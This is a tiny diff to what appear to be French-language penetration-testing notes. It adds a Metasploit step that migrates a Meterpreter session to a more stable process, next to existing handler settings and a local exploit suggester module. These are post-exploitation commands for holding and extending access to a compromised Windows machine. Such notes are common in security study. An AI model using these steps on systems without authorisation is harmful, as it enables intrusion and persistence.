@@ -45,3 +45,5 @@ set ExitOnSession false</br>
 exploit -j -z</br>
 
 use post/multi/recon/local_exploit_suggester</br>
+
+run post/windows/manage/migrate pour changer sur un processus plus fiable</br>
